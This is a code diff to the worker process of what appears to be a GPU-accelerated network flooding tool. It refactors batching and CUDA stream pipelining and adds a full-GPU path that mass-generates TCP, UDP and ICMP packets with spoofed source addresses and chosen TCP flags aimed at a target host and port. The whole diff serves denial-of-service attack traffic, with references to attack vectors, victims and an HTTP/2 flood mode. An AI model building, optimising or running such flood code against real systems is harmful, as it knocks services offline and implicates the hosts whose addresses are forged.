@@ -1020,8 +1020,35 @@ async def worker_process(
                 log_warning(f"[Worker {worker_id}] pinned pool configure failed: {e}")
 
             _gpu_ring_capacity = max(1, int(args.get("gpu_ring_capacity", 3) or 3))
+            _gpu_batch_size = max(
+                1,
+                int(args.get("gpu_batch_size", os.environ.get("SAMURAI_GPU_BATCH", 100000)) or 100000),
+            )
+            _gpu_stream_count = max(
+                2,
+                int(args.get("gpu_stream_count", os.environ.get("SAMURAI_GPU_STREAMS", 3)) or 3),
+            )
+            _gpu_pipeline_depth = max(
+                1,
+                int(
+                    args.get(
+                        "gpu_pipeline_depth",
+                        os.environ.get("SAMURAI_GPU_PIPELINE_DEPTH", 2),
+                    )
+                    or 2
+                ),
+            )
+            _gpu_pipeline_depth = min(_gpu_pipeline_depth, _gpu_ring_capacity)
+            _gpu_full_variation = bool(args.get("gpu_full_variation", True))
             _gpu_ring_depth_peak = 0
             _gpu_ring_block_wait_ns = 0
+            worker_stats["gpu_batch_size"] = int(_gpu_batch_size)
+            worker_stats["gpu_stream_count"] = int(_gpu_stream_count)
+            worker_stats["gpu_pipeline_depth"] = int(_gpu_pipeline_depth)
+            worker_stats["gpu_full_variation"] = 1 if _gpu_full_variation else 0
+
+            def _build_stream_ring():
+                return [cp.cuda.Stream(non_blocking=True) for _ in range(_gpu_stream_count)]
 
             _state_engine_ready = False
             _state_sweep_interval_s = max(
@@ -1127,6 +1154,17 @@ async def worker_process(
                 if ingest_state:
                     _ingest_state_from_batch(send_batch, int(send_stats.get("sent", 0) or 0))
                 _maybe_sweep_state()
+
+            async def _drain_ring_to_depth(
+                ring_q: asyncio.Queue,
+                target_port: int,
+                *,
+                keep_depth: int,
+                ingest_state: bool = False,
+            ):
+                target_depth = max(0, int(keep_depth))
+                while ring_q.qsize() > target_depth:
+                    await _consume_one_ring_batch(ring_q, target_port, ingest_state=ingest_state)
             
             # Re-import senders as something else if needed, OR relies on top-level import
             # The error is likely because `senders` was imported inside this block in a previous version
@@ -1160,15 +1198,11 @@ async def worker_process(
                 mss_val = tcp_params['mss']
                 ttl_val = tcp_params['ttl']
 
-                stream_ring = [
-                    cp.cuda.Stream(non_blocking=True),
-                    cp.cuda.Stream(non_blocking=True),
-                    cp.cuda.Stream(non_blocking=True),
-                ]
+                stream_ring = _build_stream_ring()
                 stream_idx = 0
                 ready_queue = []
 
-                BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
+                BATCH_SIZE = int(_gpu_batch_size)
                 remaining = args['count']
                 payload_engine = gpu_payload.GPUPayloadEngine(
                     BATCH_SIZE,
@@ -1227,10 +1261,10 @@ async def worker_process(
                     }
                     current_batch["ready_event"].record(current_batch["stream"])
                     ready_queue.append(current_batch)
-                    stream_idx = (stream_idx + 1) % 3
+                    stream_idx = (stream_idx + 1) % len(stream_ring)
                     remaining -= batch_count
 
-                    if len(ready_queue) >= 2:
+                    while len(ready_queue) >= _gpu_pipeline_depth:
                         send_batch = ready_queue.pop(0)
                         await _await_cuda_event(send_batch["ready_event"])
                         send_buf = send_batch["cpu"]
@@ -1294,7 +1328,7 @@ async def worker_process(
             if args['attack_vector'] == 'http2':
                 log_info("Initializing GPU HTTP/2 planner (hybrid GPU plan + CPU transport)...")
                 verify_ssl = (str(args.get('http_verify', 'true')).lower() != "false")
-                BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
+                BATCH_SIZE = int(_gpu_batch_size)
                 remaining = int(args['count'])
                 payload_engine = gpu_payload.GPUPayloadEngine(
                     BATCH_SIZE,
@@ -1438,14 +1472,10 @@ async def worker_process(
                     gw_mac_int = mac_to_int(get_gateway_mac(victim_ip))
                 except Exception:
                     gw_mac_int = 0xFFFFFFFFFFFF
-                stream_ring = [
-                    cp.cuda.Stream(non_blocking=True),
-                    cp.cuda.Stream(non_blocking=True),
-                    cp.cuda.Stream(non_blocking=True),
-                ]
+                stream_ring = _build_stream_ring()
                 stream_idx = 0
                 ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
-                BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
+                BATCH_SIZE = int(_gpu_batch_size)
                 remaining = args['count']
 
                 while remaining > 0:
@@ -1476,11 +1506,15 @@ async def worker_process(
                     if ring_q.full():
                         await _consume_one_ring_batch(ring_q, 0, ingest_state=True)
                     await _enqueue_with_backpressure(ring_q, current_batch)
-                    stream_idx = (stream_idx + 1) % 3
+                    stream_idx = (stream_idx + 1) % len(stream_ring)
                     remaining -= batch_count
 
-                    if ring_q.qsize() >= 2:
-                        await _consume_one_ring_batch(ring_q, 0, ingest_state=True)
+                    await _drain_ring_to_depth(
+                        ring_q,
+                        0,
+                        keep_depth=_gpu_pipeline_depth - 1,
+                        ingest_state=True,
+                    )
 
                     await asyncio.sleep(0)
 
@@ -1543,11 +1577,7 @@ async def worker_process(
                     template_pool.append(t)
 
                 # 3. Main Loop (one-batch-ahead pipeline)
-                stream_ring = [
-                    cp.cuda.Stream(non_blocking=True),
-                    cp.cuda.Stream(non_blocking=True),
-                    cp.cuda.Stream(non_blocking=True),
-                ]
+                stream_ring = _build_stream_ring()
                 stream_idx = 0
                 gw_mac_int = utils.mac_to_int(utils.get_gateway_mac(args['target']))
                 
@@ -1618,10 +1648,14 @@ async def worker_process(
                     if ring_q.full():
                         await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
                     await _enqueue_with_backpressure(ring_q, current_batch)
-                    stream_idx = (stream_idx + 1) % 3
+                    stream_idx = (stream_idx + 1) % len(stream_ring)
 
-                    if ring_q.qsize() >= 2:
-                        await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
+                    await _drain_ring_to_depth(
+                        ring_q,
+                        args['port'],
+                        keep_depth=_gpu_pipeline_depth - 1,
+                        ingest_state=True,
+                    )
 
                     # In stateful mode, we need to loop to allow handshakes to complete.
                     if args['count'] > 0 and time.time() - start_time > 5:
@@ -1691,15 +1725,11 @@ async def worker_process(
                     
                     # Standard anomaly packets
                     if std_types is None or len(std_types) > 0:
-                        stream_ring_std = [
-                            cp.cuda.Stream(non_blocking=True),
-                            cp.cuda.Stream(non_blocking=True),
-                            cp.cuda.Stream(non_blocking=True),
-                        ]
+                        stream_ring_std = _build_stream_ring()
                         std_idx = 0
                         std_ready_queue = []
                         std_remaining = args['count']
-                        std_batch_size = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
+                        std_batch_size = int(_gpu_batch_size)
 
                         while std_remaining > 0:
                             std_count = min(std_remaining, std_batch_size)
@@ -1730,10 +1760,10 @@ async def worker_process(
                             }
                             std_current["ready_event"].record(std_current["stream"])
                             std_ready_queue.append(std_current)
-                            std_idx = (std_idx + 1) % 3
+                            std_idx = (std_idx + 1) % len(stream_ring_std)
                             std_remaining -= std_count
 
-                            if len(std_ready_queue) >= 2:
+                            while len(std_ready_queue) >= _gpu_pipeline_depth:
                                 std_send = std_ready_queue.pop(0)
                                 await _await_cuda_event(std_send["ready_event"])
                                 worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
@@ -1823,23 +1853,118 @@ async def worker_process(
                 
                 return
 
-            # Hybrid Mode: Create template POOL on CPU, replicate on GPU
-            
-            # Determine Pool Size
+            # Hybrid Mode: prefer full-GPU variation path for basic L4 traffic.
+            protocol_name = str(args.get("protocol", "tcp") or "tcp").strip().lower()
+            source_port = int(args.get("source_port", 0) or 0)
+            pad_size = int(args.get("pad", 0) or 0)
+            payloads = list(args.get("payloads", []) or [])
+            has_custom_payload = any(bool(p) for p in payloads)
+            is_basic_vector = str(args.get("attack_vector", "basic") or "basic").strip().lower() == "basic"
+            full_gpu_hotpath_ok = (
+                _gpu_full_variation
+                and is_basic_vector
+                and protocol_name in {"tcp", "udp", "icmp"}
+                and not bool(args.get("fragment", False))
+                and not has_custom_payload
+                and pad_size <= 0
+                and source_port <= 0
+            )
+
+            gw_mac_str = get_gateway_mac(args['target'])
+            gw_mac_int = mac_to_int(gw_mac_str)
+            total_count = int(args['count'])
+            remaining = total_count
+            BATCH_SIZE = int(_gpu_batch_size)
+            stream_ring = _build_stream_ring()
+            stream_idx = 0
+            ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
+            real_src_ip_for_gpu = str(args.get('spoof_ip') or utils.get_local_ip() or real_src_ip)
+
+            if full_gpu_hotpath_ok:
+                tcp_flags_raw = args.get("tcp_flags", "S")
+                if isinstance(tcp_flags_raw, str):
+                    try:
+                        tcp_flags_int = int(cpu_packet_engine.parse_tcp_flags(tcp_flags_raw))
+                    except Exception:
+                        tcp_flags_int = 0x02
+                else:
+                    try:
+                        tcp_flags_int = int(tcp_flags_raw or 0x02)
+                    except Exception:
+                        tcp_flags_int = 0x02
+                window_override = (
+                    int(args.get("window", -1) if args.get("window", None) is not None else -1)
+                )
+
+                log_info(
+                    f"[Worker {worker_id}] GPU full-variation hot-path aktif: "
+                    f"proto={protocol_name}, batch={BATCH_SIZE}, streams={len(stream_ring)}, depth={_gpu_pipeline_depth}"
+                )
+                while remaining > 0:
+                    batch_count = min(remaining, BATCH_SIZE)
+                    gpu_res = gpu_packet.generate_packets(
+                        count=batch_count,
+                        target_ip=args['target'],
+                        target_port=args['port'],
+                        protocol=protocol_name,
+                        spoof_ip=bool(args.get("spoof", False)),
+                        real_src_ip=real_src_ip_for_gpu,
+                        tcp_flags=tcp_flags_int,
+                        has_ethernet=True,
+                        window=window_override,
+                        stream=stream_ring[stream_idx],
+                        gateway_mac=gw_mac_int,
+                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
+                    )
+                    if gpu_res is None:
+                        log_error("GPU full-variation packet generation failed.")
+                        break
+                    packets_gpu_array, packet_size = gpu_res
+                    remaining -= batch_count
+
+                    current_batch = {
+                        "cpu": _gpu_to_host(
+                            packets_gpu_array,
+                            f"fullvar_slot{stream_idx}",
+                            stream=stream_ring[stream_idx],
+                            blocking=False,
+                        ),
+                        "count": batch_count,
+                        "packet_size": int(packet_size),
+                        "stream": stream_ring[stream_idx],
+                        "slot": stream_idx,
+                        "ready_event": cp.cuda.Event(),
+                    }
+                    current_batch["ready_event"].record(current_batch["stream"])
+                    if ring_q.full():
+                        await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
+                    await _enqueue_with_backpressure(ring_q, current_batch)
+                    stream_idx = (stream_idx + 1) % len(stream_ring)
+                    await _drain_ring_to_depth(
+                        ring_q,
+                        args['port'],
+                        keep_depth=_gpu_pipeline_depth - 1,
+                        ingest_state=True,
+                    )
+                    await asyncio.sleep(0)
+
+                while not ring_q.empty():
+                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
+                return
+
+            # Template-pool fallback for vectors/options not supported by full-GPU hot-path.
             if args['attack_vector'] == "http":
                 TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l7", 50) or 50))
             else:
                 TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l4", 10) or 10))
-                
+
             template_pool = []
-            # log_info(f"Generating template pool of size {TEMPLATE_POOL_SIZE}...") # Avoid spamming logs per worker
-            
             for _ in range(TEMPLATE_POOL_SIZE):
                 pkt_config = packet.PacketConfig(
-                    target_ip=args['target'], 
+                    target_ip=args['target'],
                     target_port=args['port'],
                     protocol=args['protocol'],
-                    spoof=False, # Template doesn't need spoofing, GPU does it
+                    spoof=False,
                     payload=args['payloads'][0] if args['payloads'] else None,
                     tcp_flags=args['tcp_flags'],
                     ttl=args['ttl'],
@@ -1850,25 +1975,18 @@ async def worker_process(
                     pad_size=args['pad'],
                     attack_vector=args['attack_vector']
                 )
-                
+
                 template_pkt = packet.create_packet(pkt_config)
-                
-                # Handle Scapy layers
-                # For TX_RING (L2 Zero-Copy), we MUST have an Ethernet header.
-                # If Scapy didn't add one (it usually doesn't for L3), we add it manually.
-                
                 full_bytes = bytes(template_pkt)
-                
                 has_ether_in_bytes = (
-                    len(full_bytes) >= 34 and 
-                    (full_bytes[14] & 0xF0) == 0x40 and 
+                    len(full_bytes) >= 34 and
+                    (full_bytes[14] & 0xF0) == 0x40 and
                     (full_bytes[0] & 0xF0) != 0x40
                 )
-                
+
                 if not has_ether_in_bytes:
                     try:
                         iface, gw_mac_bytes = senders.get_gateway_info(args['target'])
-                        
                         if not gw_mac_bytes:
                             dst_mac_bytes = b'\xff\xff\xff\xff\xff\xff'
                             iface = "eth0"
@@ -1880,35 +1998,30 @@ async def worker_process(
                             src_mac_str = get_if_hwaddr(iface)
                             clean_src_mac = src_mac_str.strip().replace(':', '').replace('-', '').replace(' ', '')
                             src_mac_bytes = bytes.fromhex(clean_src_mac)
-                        except:
+                        except Exception:
                             src_mac_bytes = b'\x00\x00\x00\x00\x00\x00'
-                            
+
                         eth_type = b'\x08\x00'
                         ether_header = dst_mac_bytes + src_mac_bytes + eth_type
                         t_bytes = ether_header + full_bytes
-                        
                     except Exception as e:
                         log_error(f"Failed to add Ether: {e}")
                         t_bytes = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00' + full_bytes
                 else:
                     t_bytes = full_bytes
-                
-                # Validate template
+
                 is_ether_ip = len(t_bytes) >= 34 and (t_bytes[14] & 0xF0) == 0x40
                 is_ip_only = len(t_bytes) >= 20 and (t_bytes[0] & 0xF0) == 0x40 and not is_ether_ip
-                
                 if not (is_ether_ip or is_ip_only):
-                    log_error(f"[CRITICAL] Generated template: Invalid format!")
+                    log_error("[CRITICAL] Generated template: Invalid format!")
                     return
-                
+
                 check_offset = 14 if is_ether_ip else 0
                 if (t_bytes[check_offset] & 0xF0) != 0x40:
                     log_error(f"[CRITICAL] Generated template: Invalid IP at offset {check_offset}")
                     return
-                     
                 template_pool.append(t_bytes)
-            
-            # Normalize template sizes (Critical for GPU memory alignment)
+
             if template_pool:
                 target_size = len(template_pool[0])
                 normalized_pool = []
@@ -1916,67 +2029,40 @@ async def worker_process(
                     if len(t) == target_size:
                         normalized_pool.append(t)
                     elif len(t) < target_size:
-                        # Pad with zeros
                         normalized_pool.append(t + b'\x00' * (target_size - len(t)))
                     else:
-                        # Truncate (Risk: might cut options, but keeps alignment)
                         normalized_pool.append(t[:target_size])
                 template_pool = normalized_pool
 
-            # Validate ALL templates
             for i, t in enumerate(template_pool):
-                # Determine offset again
                 chk_offset = 14 if (len(t) > 14 and t[0] != 0x45) else 0
-                
                 if len(t) <= chk_offset or (t[chk_offset] & 0xF0) != 0x40:
-                    log_error(f"[CRITICAL] Template {i} is invalid! Len: {len(t)}, Byte{chk_offset}: 0x{t[chk_offset] if len(t)>chk_offset else 'N/A':02x}")
+                    val = t[chk_offset] if len(t) > chk_offset else 0
+                    log_error(f"[CRITICAL] Template {i} is invalid! Len: {len(t)}, Byte{chk_offset}: 0x{val:02x}")
                     return
 
-            # 2. CUDA Setup
-            # NOTE: In some environments, CuPy stream objects are not accepted by
-            # numba kernels (TypeError: Expected a Stream object... got Stream).
-            # Use default stream path here for compatibility.
-            gw_mac_str = get_gateway_mac(args['target'])
-            gw_mac_int = mac_to_int(gw_mac_str)
-
-            # 3. Process in batches
-            BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
-            total_count = args['count']
-            remaining = total_count
-            stream_ring = [
-                cp.cuda.Stream(non_blocking=True),
-                cp.cuda.Stream(non_blocking=True),
-                cp.cuda.Stream(non_blocking=True),
-            ]
-            stream_idx = 0
-            ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
-            
-            log_info(f"[Worker {worker_id}] GPU attack starting: {total_count} packets in batches of {BATCH_SIZE}")
-            
+            log_info(
+                f"[Worker {worker_id}] GPU template-pool path: pool={TEMPLATE_POOL_SIZE}, "
+                f"batch={BATCH_SIZE}, streams={len(stream_ring)}, depth={_gpu_pipeline_depth}"
+            )
             while remaining > 0:
                 batch_count = min(remaining, BATCH_SIZE)
-                
-                # Update progress for generation phase
-                # Note: We can split progress into 'generating' and 'sending', 
-                # but for simplicity, we mark progress as packets are handed to the sender.
-                
                 gpu_res = gpu_packet.generate_packets_from_template_pool(
                     templates_bytes_list=template_pool,
                     count=batch_count,
                     target_ip=args['target'],
                     spoof_ip=args['spoof'],
-                    real_src_ip=(args.get('spoof_ip') or utils.get_local_ip()),
+                    real_src_ip=real_src_ip_for_gpu,
                     specific_src_port=args.get('source_port', -1),
                     has_ethernet=True,
                     stream=stream_ring[stream_idx],
                     gateway_mac=gw_mac_int,
                     spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                 )
-                
                 if gpu_res is None:
                     log_error("GPU packet generation failed.")
                     break
-                    
+
                 packets_gpu_array, packet_size = gpu_res
                 remaining -= batch_count
 
@@ -1998,10 +2084,12 @@ async def worker_process(
                     await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
                 await _enqueue_with_backpressure(ring_q, current_batch)
                 stream_idx = (stream_idx + 1) % len(stream_ring)
-
-                if ring_q.qsize() >= 2:
-                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
-
+                await _drain_ring_to_depth(
+                    ring_q,
+                    args['port'],
+                    keep_depth=_gpu_pipeline_depth - 1,
+                    ingest_state=True,
+                )
                 await asyncio.sleep(0)
 
             while not ring_q.empty():
